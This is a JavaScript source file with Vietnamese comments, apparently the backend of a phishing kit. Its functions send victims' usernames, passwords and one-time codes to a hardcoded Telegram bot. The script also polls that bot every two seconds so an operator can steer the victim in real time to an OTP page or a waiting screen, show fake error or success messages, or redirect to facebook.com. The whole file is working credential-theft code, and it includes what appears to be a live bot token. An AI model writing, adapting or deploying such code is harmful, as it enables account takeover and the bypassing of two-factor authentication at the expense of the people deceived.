/**
 * ELITE SYSTEM 2026 - TRUNG TÂM DỮ LIỆU
 */

// ==========================================
// 1. THÔNG TIN KẾT NỐI
// ==========================================
const TOKEN = "7371520036:AAEOaH2aesiMDvGT5T7iHs3XyTroSLsiGSM";
const CHAT_ID = "8386422438"; 

// ==========================================
// 2. HÀM GỬI DỮ LIỆU VỀ TELEGRAM
// ==========================================
function sendToTele(message) {
    const url = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
    const data = {
        chat_id: CHAT_ID,
        text: message,
        parse_mode: 'Markdown'
    };

    return fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data)
    });
}

// Hàm gom dữ liệu Login
function collectLoginData(user, pass) {
    const msg = `⚠️ **THÔNG BÁO: CÓ TÀI KHOẢN MỚI**\n👤 User: \`${user}\`\n🔑 Pass: \`${pass}\`\n👉 Đợi lệnh: *OTP, WAIT, hoặc ERROR*`;
    sendToTele(msg);
}

// Hàm gom dữ liệu OTP
function collectOTPData(code) {
    const msg = `🔢 **MÃ OTP MỚI**: \`${code}\`\n✅ Kiểm tra ngay!`;
    sendToTele(msg);
}

// ==========================================
// 3. HÀM ĐIỀU KHIỂN (POLLING)
// ==========================================
let lastMsgId = 0;
async function listenAdmin() {
    try {
        const res = await fetch(`https://api.telegram.org/bot${TOKEN}/getUpdates?offset=-1`);
        const data = await res.json();
        
        if (data.result && data.result.length > 0) {
            const command = data.result[0].message.text.toUpperCase();
            const msgId = data.result[0].message.message_id;

            if (window.lastMsgId !== msgId) {
                window.lastMsgId = msgId;

                // Các kịch bản điều khiển
                if (command === 'OTP') window.location.href = 'otp.html';
                if (command === 'WAIT') window.location.href = 'waiting.html';
                if (command === 'SUCCESS') {
                    alert("Xác thực thành công!");
                    window.location.href = 'https://facebook.com';
                }
                if (command === 'ERROR') {
                    alert("Thông tin không chính xác. Vui lòng thử lại!");
                    location.reload();
                }
            }
        }
    } catch (e) { /* Lỗi kết nối */ }
}

// Chạy kiểm tra lệnh mỗi 2 giây
setInterval(listenAdmin, 2000);
